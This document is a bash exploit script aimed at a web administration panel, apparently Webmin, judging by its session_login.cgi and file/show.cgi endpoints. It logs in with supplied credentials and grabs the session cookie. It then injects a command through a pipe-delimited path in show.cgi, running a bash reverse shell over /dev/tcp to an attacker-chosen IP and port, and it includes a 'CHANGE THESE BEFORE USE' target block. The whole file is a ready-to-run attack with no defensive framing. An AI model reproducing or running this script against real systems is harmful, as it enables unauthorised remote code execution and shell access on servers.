#!/bin/bash

function authenticate() {
	login_url=$1
	username=$2
	password=$3

	# Use header "Cookie: testing=1"; data "page=%2F&user=$username&pass=$password"; store cookies in file "cookiefile"; write output to /dev/null; write out the http response code
	http_status=$(curl "$login_url" -X POST -H "Cookie: testing=1" -d "page=%2F&user=$username&pass=$password" -c cookiefile -o /dev/null --write-out "%{http_code}");

	if [ $http_status == "302" ]; then {
		auth_cookie="sid=$(awk '/sid/ {print $NF}' cookiefile)";
		echo "$auth_cookie";
		return 0;
	}; else {
		return 1;
	}; fi
}

function exploit() {
	exploit_url=$1
	auth_cookie="$2"

	# Have to ignore the content length or we get an error unfortunately
	http_status=$(curl "$exploit_url" -X GET -H "Cookie: $auth_cookie" -o /dev/null --write-out "%{http_code}" --ignore-content-length);

	if [ $http_status == "200" ]; then {
		return 0;
	}; else {
		return 1;
	}; fi
}

function gen_alnum_str() {
	num_chars=$(awk 'BEGIN { srand(); print int(rand() * 5 + 5); }');
	rand_alnum_string=$(awk 'BEGIN {
		srand();
		chars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		for(i = 0; i < '$num_chars'; i++) {
			printf substr(chars, int(rand() * 62.99), 1);
		}
	}');
	echo "$rand_alnum_string"
}

# CHANGE THESE BEFORE USE
target_ip="localhost"
port="80"
username="user1"
password="1user"
revshell_target_ip="localhost"
revshell_target_port="8000"

payload="bash -c 'exec /bin/bash -i >& /dev/tcp/$revshell_target_ip/$revshell_target_port 0>&1'"
login_url="http://$target_ip/session_login.cgi"
exploit_url="http://$target_ip/file/show.cgi/bin/$(gen_alnum_str)|$payload|"

auth_cookie=$(authenticate "$login_url" "$username" "$password");
if [ $? -ne 0 ]; then { # If the return value of authenticate is not 0, this indicates a fail, so inform user and exit
	echo "Error: Authentication Failure";
	exit;
}; fi
echo "Authentication Cookie: $auth_cookie";

exploit "$exploit_url" "$auth_cookie"
if [ $? -ne 0 ]; then {
	echo "Error: Failed to execute payload";
	exit;
}; fi
echo "Successfully executed payload";